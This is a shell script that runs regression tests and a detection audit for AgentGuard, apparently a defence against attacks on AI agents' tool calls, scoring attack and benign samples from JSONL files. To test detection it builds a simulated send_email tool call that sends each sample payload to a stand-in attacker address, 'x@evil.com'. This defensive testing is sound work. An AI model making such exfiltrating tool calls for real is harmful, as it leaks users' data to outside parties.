#!/usr/bin/env bash
set -euo pipefail

echo "=== AgentGuard Attack Sample Regression Test ==="
echo ""

cd "$(dirname "$0")/../packages/core"

echo "Running security tests..."
uv run python -m pytest tests/security/ -v --tb=short

echo ""
echo "Running attack sample detection audit..."
uv run python -c "
import json, asyncio
from pathlib import Path
from agentguard_core.engine.intent.rule_engine import RuleEngine
from agentguard_core.engine.intent.anomaly import AnomalyDetector
from agentguard_core.engine.intent.models import ToolCall, IntentContext, Intent
from agentguard_core.engine.trust.levels import TrustLevel

async def audit():
    engine=RuleEngine(); detector=AnomalyDetector()
    t_m=0;det=0;t_b=0;fp=0
    for f in sorted(Path('tests/security/samples').glob('*.jsonl')):
        for line in f.read_text().strip().splitlines():
            if not line.strip(): continue
            s=json.loads(line)
            mal=s.get('expected_block',s.get('expected_action')=='BLOCK')
            ben=(not mal if 'expected_block' in s else s.get('expected_action')=='ALLOW')
            if mal:
                t_m+=1;tc=ToolCall(name='send_email',params={'body':s['payload'],'to':'x@evil.com'})
                ctx=IntentContext(original_message='p',intent=Intent(intent='p'),current_data_trust_level=TrustLevel.EXTERNAL)
                if engine.check(tc,ctx).triggered: det+=1;continue
                if detector.check(tc,ctx).score>0.15: det+=1
            if ben:
                t_b+=1;tc=ToolCall(name='summarize',params={'text':s['payload']})
                ctx=IntentContext(original_message=s['payload'],intent=Intent(intent='summarize',expected_tools=['summarize']),current_data_trust_level=TrustLevel.VERIFIED)
                if engine.check(tc,ctx).triggered and engine.check(tc,ctx).decision.action.value=='BLOCK': fp+=1
    rate=det/t_m*100 if t_m else 0
    print(f'Detection: {det}/{t_m} ({rate:.0f}%)')
    print(f'Benign: {t_b} tested, {fp} false positives')
    print(f'Result: {\"PASS\" if rate>=95 and fp==0 else \"FAIL\"}')

asyncio.run(audit())
"

echo ""
echo "=== Done ==="
